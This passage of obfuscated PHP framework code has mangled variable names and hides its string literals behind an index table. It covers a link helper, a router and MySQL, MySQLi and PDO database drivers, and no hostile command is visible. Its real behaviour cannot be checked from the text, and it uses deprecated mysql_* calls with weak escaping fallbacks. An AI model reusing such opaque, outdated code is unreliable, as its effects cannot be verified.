$²àÈáİ–[1851]) { $Í¿•û‹Ä = STATIC_PATH . $àˆç·Ç¾ . $²àÈáİ–[1850] . $†±œÒ®±; } else { if ($‹³ÀßË¹ == $²àÈáİ–[1852]) { $Í¿•û‹Ä = APP_HOST . $²àÈáİ–[1853] . $àˆç·Ç¾ . $²àÈáİ–[1850] . $†±œÒ®±; } else { if (isset($»Ë™ÇÓ[$‹³ÀßË¹])) { $Í¿•û‹Ä = $»Ë™ÇÓ[$‹³ÀßË¹] . $àˆç·Ç¾ . $²àÈáİ–[1850] . $»ÙËéØë; } } } } } } if (!$£ÑÀ‚Ô×) { return $Í¿•û‹Ä; } echo $Í¿•û‹Ä; } public function link($¿ëçúˆÄ = false, $ãœÜ¾˜ö = '') { $´Ñ„¿®– =& $_SERVER[Ï×Œõ”û]; $ıõÈœ‘Ö = $this->linkHas == !1; $this->linkHas = !0; if (!$¿ëçúˆÄ) { $this->link($´Ñ„¿®–[1854], $´Ñ„¿®–[1852]); $this->link($´Ñ„¿®–[1855], $´Ñ„¿®–[1851]); $this->link($´Ñ„¿®–[1856], $´Ñ„¿®–[1851]); $this->link($´Ñ„¿®–[1857], $´Ñ„¿®–[1851]); $this->link($´Ñ„¿®–[1858], $´Ñ„¿®–[1851]); if ($ıõÈœ‘Ö) { Hook::trigger($´Ñ„¿®–[1859]); } return; } $¯œ‰›ŞÙ = $this->url($¿ëçúˆÄ, $ãœÜ¾˜ö, !1); if (substr($¿ëçúˆÄ, -3) == $´Ñ„¿®–[1860]) { echo $´Ñ„¿®–[1861] . $¯œ‰›ŞÙ . $´Ñ„¿®–[1862] . $´Ñ„¿®–[287]; } else { if (substr($¿ëçúˆÄ, -4) == $´Ñ„¿®–[1863]) { echo $´Ñ„¿®–[1864] . $¯œ‰›ŞÙ . $´Ñ„¿®–[1865] . $´Ñ„¿®–[287]; } } if ($ıõÈœ‘Ö) { Hook::trigger($´Ñ„¿®–[1859]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\57\x5d\53", "\72\156\x75\x6d" => "\x5b\x30\55\x39\x5d\53", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ğøª¿œÀ, $Ÿµáç…) { $Çñ£ÒàÎ =& $_SERVER[Ï×Œõ”û]; if ($ğøª¿œÀ == $Çñ£ÒàÎ[1866]) { $‰³“æÉ = array_map($Çñ£ÒàÎ[1867], $Ÿµáç…[0]); $ÏÇÖ·· = strpos($Ÿµáç…[1], $Çñ£ÒàÎ[8]) === 0 ? $Ÿµáç…[1] : $Çñ£ÒàÎ[8] . $Ÿµáç…[1]; $úì§ö–ç = $Ÿµáç…[2]; } else { $‰³“æÉ = null; $ÏÇÖ·· = strpos($Ÿµáç…[0], $Çñ£ÒàÎ[8]) === 0 ? $Ÿµáç…[0] : $Çñ£ÒàÎ[8] . $Ÿµáç…[0]; $úì§ö–ç = $Ÿµáç…[1]; } array_push(self::$maps, $‰³“æÉ); array_push(self::$routes, $ÏÇÖ··); array_push(self::$methods, strtoupper($ğøª¿œÀ)); array_push(self::$callbacks, $úì§ö–ç); } public static function error($ªøã») { self::$errorCallback = $ªøã»; } public static function haltOnMatch($¥¸Óä¾ï = true) { self::$halts = $¥¸Óä¾ï; } public static function dispatch() { $ôŸ‰–œÌ =& $_SERVER[Ï×Œõ”û]; $‡ğæŸ½÷ = parse_url($_SERVER[$ôŸ‰–œÌ[1868]], PHP_URL_PATH); $Çº§±ø = $_SERVER[$ôŸ‰–œÌ[163]]; $¶Ÿúã¨¦ = array_keys(static::$patterns); $Éñë¦å¤ = array_values(static::$patterns); $ùÊ×è¹§ = !1; self::$routes = preg_replace($ôŸ‰–œÌ[1420], $ôŸ‰–œÌ[8], self::$routes); if (in_array($‡ğæŸ½÷, self::$routes)) { $È—šãş£ = array_keys(self::$routes, $‡ğæŸ½÷); foreach ($È—šãş£ as $Áãß³öŠ) { if (self::$methods[$Áãß³öŠ] == $Çº§±ø || self::$methods[$Áãß³öŠ] == $ôŸ‰–œÌ[1869] || in_array($Çº§±ø, self::$maps[$Áãß³öŠ])) { $ùÊ×è¹§ = !0; if (!is_object(self::$callbacks[$Áãß³öŠ])) { $ÃÈúë¨ = explode($ôŸ‰–œÌ[8], self::$callbacks[$Áãß³öŠ]); $œÙÒĞôÒ = end($ÃÈúë¨); $øğê»óà = explode($ôŸ‰–œÌ[1350], $œÙÒĞôÒ); $¼ïÄç±Ë = new $øğê»óà[0](); $¼ïÄç±Ë->{$øğê»óà[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Áãß³öŠ]); if (self::$halts) { return; } } } } } else { $Â¼§ÙïÔ = 0; foreach (self::$routes as $Áãß³öŠ) { if (strpos($Áãß³öŠ, $ôŸ‰–œÌ[4]) !== !1) { $Áãß³öŠ = str_replace($¶Ÿúã¨¦, $Éñë¦å¤, $Áãß³öŠ); } if (preg_match($ôŸ‰–œÌ[1870] . $Áãß³öŠ . $ôŸ‰–œÌ[1871], $‡ğæŸ½÷, $ªÔ±À¶ı)) { if (self::$methods[$Â¼§ÙïÔ] == $Çº§±ø || self::$methods[$Â¼§ÙïÔ] == $ôŸ‰–œÌ[1869] || !empty(self::$maps[$Â¼§ÙïÔ]) && in_array($Çº§±ø, self::$maps[$Â¼§ÙïÔ])) { $ùÊ×è¹§ = !0; array_shift($ªÔ±À¶ı); if (!is_object(self::$callbacks[$Â¼§ÙïÔ])) { $ÃÈúë¨ = explode($ôŸ‰–œÌ[8], self::$callbacks[$Â¼§ÙïÔ]); $œÙÒĞôÒ = end($ÃÈúë¨); $øğê»óà = explode($ôŸ‰–œÌ[1350], $œÙÒĞôÒ); $¼ïÄç±Ë = new $øğê»óà[0](); if (!method_exists($¼ïÄç±Ë, $øğê»óà[1])) { echo $ôŸ‰–œÌ[1872]; } else { call_user_func_array(array($¼ïÄç±Ë, $øğê»óà[1]), $ªÔ±À¶ı); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Â¼§ÙïÔ], $ªÔ±À¶ı); if (self::$halts) { return; } } } } $Â¼§ÙïÔ++; } } if ($ùÊ×è¹§ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $–â÷„æ =& $_SERVER[Ï×Œõ”û]; header($_SERVER[$–â÷„æ[1873]] . $–â÷„æ[1874]); echo $–â÷„æ[1875]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ôŸ‰–œÌ[1868]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto E¢‹¦“˜È…; E’”Ùö—…á: class DbMysql extends Db { public function __construct($ş±Şå÷¹ = '') { $‡ªı‘öÉ =& $_SERVER[Ï×Œõ”û]; if (!extension_loaded($‡ªı‘öÉ[910])) { think_exception(think_lang($‡ªı‘öÉ[14]) . $‡ªı‘öÉ[1003]); } if (!empty($ş±Şå÷¹)) { $this->config = $ş±Şå÷¹; if (empty($this->config[$‡ªı‘öÉ[17]])) { $this->config[$‡ªı‘öÉ[17]] = $‡ªı‘öÉ[12]; } } } public function connect($Ó¡õâÉÓ = '', $íÙê»¡› = 0, $ö‘çşÙ± = false) { $ÖË´å =& $_SERVER[Ï×Œõ”û]; if (!isset($this->linkID[$íÙê»¡›])) { if (empty($Ó¡õâÉÓ)) { $Ó¡õâÉÓ = $this->config; } $ó‡éª‰Ğ = $Ó¡õâÉÓ[$ÖË´å[1004]] . ($Ó¡õâÉÓ[$ÖË´å[1005]] ? "\x3a{$Ó¡õâÉÓ[$ÖË´å[1005]]}" : $ÖË´å[12]); $û«œ‘¢´ = !empty($Ó¡õâÉÓ[$ÖË´å[17]][$ÖË´å[18]]) ? $Ó¡õâÉÓ[$ÖË´å[17]][$ÖË´å[18]] : $this->pconnect; if ($û«œ‘¢´) { $this->linkID[$íÙê»¡›] = mysql_pconnect($ó‡éª‰Ğ, $Ó¡õâÉÓ[$ÖË´å[1006]], $Ó¡õâÉÓ[$ÖË´å[1007]], 131072); } else { $this->linkID[$íÙê»¡›] = mysql_connect($ó‡éª‰Ğ, $Ó¡õâÉÓ[$ÖË´å[1006]], $Ó¡õâÉÓ[$ÖË´å[1007]], !0, 131072); } if (!$this->linkID[$íÙê»¡›] || !empty($Ó¡õâÉÓ[$ÖË´å[21]]) && !mysql_select_db($Ó¡õâÉÓ[$ÖË´å[21]], $this->linkID[$íÙê»¡›])) { think_exception(mysql_error()); } $€íÄéİ = mysql_get_server_info($this->linkID[$íÙê»¡›]); mysql_query($ÖË´å[1008] . think_config($ÖË´å[1009]) . $ÖË´å[58], $this->linkID[$íÙê»¡›]); if ($€íÄéİ > $ÖË´å[1010]) { mysql_query($ÖË´å[1011], $this->linkID[$íÙê»¡›]); } $this->connected = !0; if (1 != think_config($ÖË´å[22])) { unset($this->config); } } return $this->linkID[$íÙê»¡›]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÊÑ°İ„™) { $ç³§ÚŸâ =& $_SERVER[Ï×Œõ”û]; if (0 === stripos($ÊÑ°İ„™, $ç³§ÚŸâ[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÑ°İ„™; if ($this->queryID) { $this->free(); } think_action_status($ç³§ÚŸâ[23], 1); think_status($ç³§ÚŸâ[24]); $this->queryID = mysql_query($ÊÑ°İ„™, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÊÁ´Úå®) { $¥Çş´– =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÁ´Úå®; if ($this->queryID) { $this->free(); } think_action_status($¥Çş´–[25], 1); think_status($¥Çş´–[24]); $ô–§’ = mysql_query($ÊÁ´Úå®, $this->_linkID); $this->debug(); if (!1 === $ô–§’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ï×Œõ”û][1012], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªâöÈÆ = mysql_query($_SERVER[Ï×Œõ”û][1013], $this->_linkID); $this->transTimes = 0; if (!$ªâöÈÆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $—©´èÉÜ = mysql_query($_SERVER[Ï×Œõ”û][1014], $this->_linkID); $this->transTimes = 0; if (!$—©´èÉÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ö«‰Ë»Ø = array(); if ($this->numRows > 0) { while ($¢„Áõñê = mysql_fetch_assoc($this->queryID)) { $Ö«‰Ë»Ø[] = $¢„Áõñê; } mysql_data_seek($this->queryID, 0); } return $Ö«‰Ë»Ø; } public function getFields($Ğ±¼Œå) { $±Ü©âŸ÷ =& $_SERVER[Ï×Œõ”û]; $äŠŒ¹¨Ğ = $this->query($±Ü©âŸ÷[1015] . $this->parseKey($Ğ±¼Œå)); $äıéÇ»Ø = array(); if ($äŠŒ¹¨Ğ) { foreach ($äŠŒ¹¨Ğ as $É“½£¤ => $úÜàŒ†ô) { $äıéÇ»Ø[$úÜàŒ†ô[$±Ü©âŸ÷[31]]] = array($±Ü©âŸ÷[32] => $úÜàŒ†ô[$±Ü©âŸ÷[31]], $±Ü©âŸ÷[33] => $úÜàŒ†ô[$±Ü©âŸ÷[34]], $±Ü©âŸ÷[35] => (bool) (strtoupper($úÜàŒ†ô[$±Ü©âŸ÷[36]]) === $±Ü©âŸ÷[1016]), $±Ü©âŸ÷[37] => $úÜàŒ†ô[$±Ü©âŸ÷[38]], $±Ü©âŸ÷[39] => strtolower($úÜàŒ†ô[$±Ü©âŸ÷[40]]) == $±Ü©âŸ÷[41], $±Ü©âŸ÷[42] => strtolower($úÜàŒ†ô[$±Ü©âŸ÷[43]]) == $±Ü©âŸ÷[44]); } } return $äıéÇ»Ø; } public function getTables($ƒòàšœŸ = '') { $µõË“‘§ =& $_SERVER[Ï×Œõ”û]; if (!empty($ƒòàšœŸ)) { $©¾æùìÌ = $µõË“‘§[1017] . $ƒòàšœŸ . $µõË“‘§[1018]; } else { $©¾æùìÌ = $µõË“‘§[1019]; } $‘œÔñ¬ = $this->query($©¾æùìÌ); $íÇÑìé = array(); foreach ($‘œÔñ¬ as $Ô€š¡ => $ÆªİÌµ) { $íÇÑìé[$Ô€š¡] = current($ÆªİÌµ); } return $íÇÑìé; } public function replace($ïŸ»¥Ö, $ûë‚Ó»ö = array()) { $˜á³Ğ¯« =& $_SERVER[Ï×Œõ”û]; foreach ($ïŸ»¥Ö as $¹‘ê÷¯ => $ê¡â»ÂÒ) { $ØœÍÖ¾¸ = $this->parseValue($ê¡â»ÂÒ); if (is_scalar($ØœÍÖ¾¸)) { $ò‹«ß’ü[] = $ØœÍÖ¾¸; $ß¯ôçî[] = $this->parseKey($¹‘ê÷¯); } } $ª›ÜËÇÖ = $˜á³Ğ¯«[1020] . $this->parseTable($ûë‚Ó»ö[$˜á³Ğ¯«[359]]) . $˜á³Ğ¯«[1021] . implode($˜á³Ğ¯«[50], $ß¯ôçî) . $˜á³Ğ¯«[1022] . implode($˜á³Ğ¯«[50], $ò‹«ß’ü) . $˜á³Ğ¯«[1023]; return $this->execute($ª›ÜËÇÖ); } public function insertAll($â¿†«Óå, $ïÕÈ¸Ñ = array(), $ÊÁÈÌ€ = false) { $¬·«‹×é =& $_SERVER[Ï×Œõ”û]; if (!is_array($â¿†«Óå[0])) { return !1; } $ùÚŸ¶Ûä = array_keys($â¿†«Óå[0]); $¨²‡°ú¦ = array(); foreach ($â¿†«Óå as $ØÅªèÏÈ) { $íİÊàÎí = array(); foreach ($ØÅªèÏÈ as $ƒíÊ”É => $šçÚÍ¢) { $šçÚÍ¢ = $this->parseValue($šçÚÍ¢); if (is_scalar($šçÚÍ¢)) { $íİÊàÎí[] = $šçÚÍ¢; } } $¨²‡°ú¦[] = $¬·«‹×é[339] . implode($¬·«‹×é[50], $íİÊàÎí) . $¬·«‹×é[1023]; } array_walk($ùÚŸ¶Ûä, array($this, $¬·«‹×é[1024])); $çö²ıªï = $ÊÁÈÌ€ ? $¬·«‹×é[1025] : $¬·«‹×é[1026]; $çö²ıªï = $¬·«‹×é[1026]; $ ùÆúŸ¥ = $çö²ıªï . $¬·«‹×é[1027] . $this->parseTable($ïÕÈ¸Ñ[$¬·«‹×é[359]]) . $¬·«‹×é[1021] . implode($¬·«‹×é[50], $ùÚŸ¶Ûä) . $¬·«‹×é[1028] . implode($¬·«‹×é[50], $¨²‡°ú¦); if ($ÊÁÈÌ€) { $€¢¸Ô¸– = array(); foreach ($ùÚŸ¶Ûä as $ƒíÊ”É) { if ($ƒíÊ”É == $¬·«‹×é[233] || $ƒíÊ”É == $¬·«‹×é[1029]) { continue; } $€¢¸Ô¸–[] = $ƒíÊ”É . $¬·«‹×é[1030] . $ƒíÊ”É . $¬·«‹×é[1023]; } $ ùÆúŸ¥ .= $¬·«‹×é[1031] . implode($¬·«‹×é[50], $€¢¸Ô¸–); } return $this->execute($ ùÆúŸ¥); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ù ô“Í‰ =& $_SERVER[Ï×Œõ”û]; $this->error = mysql_errno() . $ù ô“Í‰[4] . mysql_error($this->_linkID); if ($ù ô“Í‰[12] != $this->queryStr) { $this->error .= LNG($ù ô“Í‰[48]) . $this->queryStr; } think_trace($this->error, $ù ô“Í‰[12], $ù ô“Í‰[49]); return $this->error; } public function escapeString($Ù¨òÜ¾») { if ($this->_linkID) { return mysql_real_escape_string($Ù¨òÜ¾», $this->_linkID); } else { return mysql_escape_string($Ù¨òÜ¾»); } } public function parseKey(&$ËË’‘ÒÏ, $ÙùÊ = true) { $÷ô®É³Ö =& $_SERVER[Ï×Œõ”û]; if ($ÙùÊ) { $ËË’‘ÒÏ = $this->parseKeyCheck($ËË’‘ÒÏ); } if ($ËË’‘ÒÏ != $÷ô®É³Ö[222] && !preg_match($÷ô®É³Ö[1032], $ËË’‘ÒÏ)) { $ËË’‘ÒÏ = $÷ô®É³Ö[473] . trim($ËË’‘ÒÏ, $÷ô®É³Ö[473]) . $÷ô®É³Ö[473]; } return $ËË’‘ÒÏ; } } class DbMysqli extends Db { public function __construct($µŸµŠ¾ = '') { $ŸÍ¶®İÁ =& $_SERVER[Ï×Œõ”û]; if (!extension_loaded($ŸÍ¶®İÁ[1033])) { think_exception(think_lang($ŸÍ¶®İÁ[14]) . $ŸÍ¶®İÁ[1034]); } if (!empty($µŸµŠ¾)) { $this->config = $µŸµŠ¾; if (empty($this->config[$ŸÍ¶®İÁ[17]])) { $this->config[$ŸÍ¶®İÁ[17]] = $ŸÍ¶®İÁ[12]; } } } public function connect($Ïéá”Œš = '', $ƒûÅ¥Û = 0) { $³âùË¯Õ =& $_SERVER[Ï×Œõ”û]; if (!isset($this->linkID[$ƒûÅ¥Û])) { if (empty($Ïéá”Œš)) { $Ïéá”Œš = $this->config; } $this->linkID[$ƒûÅ¥Û] = new mysqli($Ïéá”Œš[$³âùË¯Õ[1004]], $Ïéá”Œš[$³âùË¯Õ[1006]], $Ïéá”Œš[$³âùË¯Õ[1007]], $Ïéá”Œš[$³âùË¯Õ[21]], $Ïéá”Œš[$³âùË¯Õ[1005]] ? intval($Ïéá”Œš[$³âùË¯Õ[1005]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ã¢½«Šô = $this->linkID[$ƒûÅ¥Û]->server_version; $this->linkID[$ƒûÅ¥Û]->query($³âùË¯Õ[1008] . think_config($³âùË¯Õ[1009]) . $³âùË¯Õ[58]); if ($ã¢½«Šô > $³âùË¯Õ[1010]) { $this->linkID[$ƒûÅ¥Û]->query($³âùË¯Õ[1011]); } $this->connected = !0; if (1 != think_config($³âùË¯Õ[22])) { unset($this->config); } } return $this->linkID[$ƒûÅ¥Û]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($–ğƒ¸Î‚) { $¸–â¼ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $–ğƒ¸Î‚; if ($this->queryID) { $this->free(); } think_action_status($¸–â¼[23], 1); think_status($¸–â¼[24]); $this->queryID = $this->_linkID->query($–ğƒ¸Î‚); if ($this->_linkID->more_results()) { while (($“æ‰—© = $this->_linkID->next_result()) != NULL) { $“æ‰—©->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ãã©™€) { $ú˜€ı¿æ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ãã©™€; if ($this->queryID) { $this->free(); } think_action_status($ú˜€ı¿æ[25], 1); think_status($ú˜€ı¿æ[24]); $šğÃÕï¤ = $this->_linkID->query($Ãã©™€); $this->debug(); if (!1 === $šğÃÕï¤) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ï¤¦Éµ‹ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ï¤¦Éµ‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ø²Ÿş†Ò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ø²Ÿş†Ò) { $this->error(); return !1; } } return !0; } private function getAll() { $È œéÄÔ = array(); if ($this->numRows > 0) { for ($è¯çïÒ = 0; $è¯çïÒ < $this->numRows; $è¯çïÒ++) { $È œéÄÔ[$è¯çïÒ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $È œéÄÔ; } public function getFields($Èƒİ‡Ä) { $«Ä»‡«¨ =& $_SERVER[Ï×Œõ”û]; $äı¢ÇÅ = $this->query($«Ä»‡«¨[1015] . $this->parseKey($Èƒİ‡Ä)); $ƒù„ú—Ï = array(); if ($äı¢ÇÅ) { foreach ($äı¢ÇÅ as $¿Õ„éı => $ŒìŸãÇˆ) { $ƒù„ú—Ï[$ŒìŸãÇˆ[$«Ä»‡«¨[31]]] = array($«Ä»‡«¨[32] => $ŒìŸãÇˆ[$«Ä»‡«¨[31]], $«Ä»‡«¨[33] => $ŒìŸãÇˆ[$«Ä»‡«¨[34]], $«Ä»‡«¨[35] => (bool) ($ŒìŸãÇˆ[$«Ä»‡«¨[36]] === $«Ä»‡«¨[12]), $«Ä»‡«¨[37] => $ŒìŸãÇˆ[$«Ä»‡«¨[38]], $«Ä»‡«¨[39] => strtolower($ŒìŸãÇˆ[$«Ä»‡«¨[40]]) == $«Ä»‡«¨[41], $«Ä»‡«¨[42] => strtolower($ŒìŸãÇˆ[$«Ä»‡«¨[43]]) == $«Ä»‡«¨[44]); } } return $ƒù„ú—Ï; } public function getTables($¥×½†“ñ = '') { $úÛÕÊÁ =& $_SERVER[Ï×Œõ”û]; $ ‰²í¨¼ = !empty($¥×½†“ñ) ? $úÛÕÊÁ[1017] . $¥×½†“ñ . $úÛÕÊÁ[1018] : $úÛÕÊÁ[1019]; $Ê„¬¶ö¹ = $this->query($ ‰²í¨¼); $·ÈºûÙ§ = array(); if ($Ê„¬¶ö¹) { foreach ($Ê„¬¶ö¹ as $¤æŞì¡Õ => $Ã€¥ì¸”) { $·ÈºûÙ§[$¤æŞì¡Õ] = current($Ã€¥ì¸”); } } return $·ÈºûÙ§; } public function replace($š·‚²¯, $»Öİ£õ„ = array()) { $ïâˆÒõµ =& $_SERVER[Ï×Œõ”û]; foreach ($š·‚²¯ as $ÆµŠËş¦ => $¨ÄÚ’¸) { $œÆ˜µùø = $this->parseValue($¨ÄÚ’¸); if (is_scalar($œÆ˜µùø)) { $›½ßœ…[] = $œÆ˜µùø; $Èş…Ô¹€[] = $this->parseKey($ÆµŠËş¦); } } $ûñ—ûª = $ïâˆÒõµ[1020] . $this->parseTable($»Öİ£õ„[$ïâˆÒõµ[359]]) . $ïâˆÒõµ[1021] . implode($ïâˆÒõµ[50], $Èş…Ô¹€) . $ïâˆÒõµ[1022] . implode($ïâˆÒõµ[50], $›½ßœ…) . $ïâˆÒõµ[1023]; return $this->execute($ûñ—ûª); } public function insertAll($ï£¶û­ , $¬üÂ² = array(), $®Ûüé„ã = false) { $“©Íá™« =& $_SERVER[Ï×Œõ”û]; if (!is_array($ï£¶û­ [0])) { return !1; } $ŞÛïñúÛ = array_keys($ï£¶û­ [0]); $ÚÕê›Îó = array(); foreach ($ï£¶û­  as $û·˜ÔÔ) { $‰Î‚Ì¹™ = array(); foreach ($û·˜ÔÔ as $¨«ıš¼ => $†¤§«¤§) { $†¤§«¤§ = $this->parseValue($†¤§«¤§); if (is_scalar($†¤§«¤§)) { $‰Î‚Ì¹™[] = $†¤§«¤§; } } $ÚÕê›Îó[] = $“©Íá™«[339] . implode($“©Íá™«[50], $‰Î‚Ì¹™) . $“©Íá™«[1023]; } array_walk($ŞÛïñúÛ, array($this, $“©Íá™«[1024])); $ÇèÅïÁØ = $®Ûüé„ã ? $“©Íá™«[1025] : $“©Íá™«[1026]; $ÇèÅïÁØ = $“©Íá™«[1026]; $èÛ†×›° = $ÇèÅïÁØ . $“©Íá™«[1027] . $this->parseTable($¬üÂ²[$“©Íá™«[359]]) . $“©Íá™«[1021] . implode($“©Íá™«[50], $ŞÛïñúÛ) . $“©Íá™«[1028] . implode($“©Íá™«[50], $ÚÕê›Îó); if ($®Ûüé„ã) { $ÛÈÏıá = array(); foreach ($ŞÛïñúÛ as $¨«ıš¼) { if ($¨«ıš¼ == $“©Íá™«[233] || $¨«ıš¼ == $“©Íá™«[1029]) { continue; } $ÛÈÏıá[] = $¨«ıš¼ . $“©Íá™«[1030] . $¨«ıš¼ . $“©Íá™«[1023]; } $èÛ†×›° .= $“©Íá™«[1031] . implode($“©Íá™«[50], $ÛÈÏıá); } return $this->execute($èÛ†×›°); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‘Á¾º´¬ =& $_SERVER[Ï×Œõ”û]; $this->error = $this->_linkID->errno . $‘Á¾º´¬[4] . $this->_linkID->error; if ($‘Á¾º´¬[12] != $this->queryStr) { $this->error .= LNG($‘Á¾º´¬[48]) . $this->queryStr; } think_trace($this->error, $‘Á¾º´¬[12], $‘Á¾º´¬[49]); return $this->error; } public function escapeString($¬¹ùÉ¬ª) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¬¹ùÉ¬ª); } else { return addslashes($¬¹ùÉ¬ª); } } public function parseKey(&$ü¨íñŒ¤, $ø™ÜÍµ = true) { $ƒï‹üŞÈ =& $_SERVER[Ï×Œõ”û]; if ($ø™ÜÍµ) { $ü¨íñŒ¤ = $this->parseKeyCheck($ü¨íñŒ¤); } if ($ü¨íñŒ¤ != $ƒï‹üŞÈ[222] && !preg_match($ƒï‹üŞÈ[1032], $ü¨íñŒ¤)) { $ü¨íñŒ¤ = $ƒï‹üŞÈ[473] . trim($ü¨íñŒ¤, $ƒï‹üŞÈ[473]) . $ƒï‹üŞÈ[473]; } return $ü¨íñŒ¤; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($»áÌÓÕŠ = '') { $˜®İï… =& $_SERVER[Ï×Œõ”û]; if (!class_exists($˜®İï…[1035])) { think_exception(think_lang($˜®İï…[14]) . $˜®İï…[1036]); } if (!empty($»áÌÓÕŠ)) { $this->config = $»áÌÓÕŠ; if (empty($this->config[$˜®İï…[17]])) { $this->config[$˜®İï…[17]] = array(); } } } public function connect($£¯¾Öº = '', $¨¬¨Ş¿Õ = 0) { $Äıõ¨ =& $_SERVER[Ï×Œõ”û]; if (!isset($this->linkID[$¨¬¨Ş¿Õ])) { if (empty($£¯¾Öº)) { $£¯¾Öº = $this->config; } $™ª“³î˜ = !empty($£¯¾Öº[$Äıõ¨[17]][$Äıõ¨[18]]) ? $£¯¾Öº[$Äıõ¨[17]][$Äıõ¨[18]] : $this->pconnect; if ($™ª“³î˜) { $£¯¾Öº[$Äıõ¨[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¨¬¨Ş¿Õ] = new PDO($£¯¾Öº[$Äıõ¨[1037]], $£¯¾Öº[$Äıõ¨[1006]], $£¯¾Öº[$Äıõ¨[1007]], $£¯¾Öº[$Äıõ¨[17]]); } catch (PDOException $Š¡‚”À) { think_exception($Š¡‚”À->getMessage()); } $this->dbType = $this->_getDsnType($£¯¾Öº[$Äıõ¨[1037]]); if (in_array($this->dbType, array($Äıõ¨[1038], $Äıõ¨[1039], $Äıõ¨[1040], $Äıõ¨[1041]))) { think_exception($Äıõ¨[1042] . $this->dbType . $Äıõ¨[1043] . $this->dbType . $Äıõ¨[1044]); } if (!$this->linkID[$¨¬¨Ş¿Õ]) { think_exception($Äıõ¨[1045]); } try { $this->linkID[$¨¬¨Ş¿Õ]->exec($Äıõ¨[1046] . think_config($Äıõ¨[1009])); } catch (Exception $Š¡‚”À) { } $this->connected = !0; if (1 != think_config($Äıõ¨[22])) { unset($this->config); } } return $this->linkID[$¨¬¨Ş¿Õ]; } public function free() { $this->PDOStatement = null; } public function query($ì•ğöº°, $¨Ë°õşº = array()) { $ÑÉ¶¤Ğ‘ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì•ğöº°; if (!empty($¨Ë°õşº)) { $this->queryStr .= $ÑÉ¶¤Ğ‘[1047] . print_r($¨Ë°õşº, !0) . $ÑÉ¶¤Ğ‘[1048]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÑÉ¶¤Ğ‘[23], 1); think_status($ÑÉ¶¤Ğ‘[24]); $this->PDOStatement = $this->_linkID->prepare($ì•ğöº°); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $öà©ñ‘ğ = $this->PDOStatement->execute($¨Ë°õşº); $this->debug(); if (!1 === $öà©ñ‘ğ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($» €Š¨‹, $Ÿ»›Ì±– = array()) { $àä¢‡¦´ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $» €Š¨‹; if (!empty($Ÿ»›Ì±–)) { $this->queryStr .= $àä¢‡¦´[1047] . print_r($Ÿ»›Ì±–, !0) . $àä¢‡¦´[1048]; } $ß õá¸ = !1; if ($this->dbType == $àä¢‡¦´[1041]) { if (preg_match($àä¢‡¦´[1049], $this->queryStr, $¾øšœÁÒ)) { $this->table = think_config($àä¢‡¦´[1050]) . str_ireplace(think_config($àä¢‡¦´[1051]), $àä¢‡¦´[464], $¾øšœÁÒ[2]); $ß õá¸ = (bool) $this->query($àä¢‡¦´[1052] . strtoupper($this->table) . $àä¢‡¦´[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($àä¢‡¦´[25], 1); think_status($àä¢‡¦´[24]); $this->PDOStatement = $this->_linkID->prepare($» €Š¨‹); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $á¯¶õ£¯ = $this->PDOStatement->execute($Ÿ»›Ì±–); $this->debug(); if (!1 === $á¯¶õ£¯) { $this->error(); return 